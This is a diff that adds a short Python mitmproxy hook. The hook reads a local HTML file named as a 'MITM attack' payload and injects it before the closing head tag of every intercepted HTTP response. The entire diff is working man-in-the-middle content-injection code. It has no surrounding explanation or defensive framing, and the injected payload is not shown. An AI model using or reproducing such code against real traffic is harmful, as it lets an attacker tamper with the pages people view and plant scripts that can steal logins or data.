@@ -1,0 +1,7 @@
+def response(flow: http.HTTPFlow) -> None:
+    if flow.response and flow.response.content:
+        file = open("detectivemeeseMITMAttack.html","r")
+        newpayload = file.read()+"</head>"
+        flow.response.content = flow.response.content.replace(b"</head>",newpayload.encode("utf-8"))
+        pass
+    
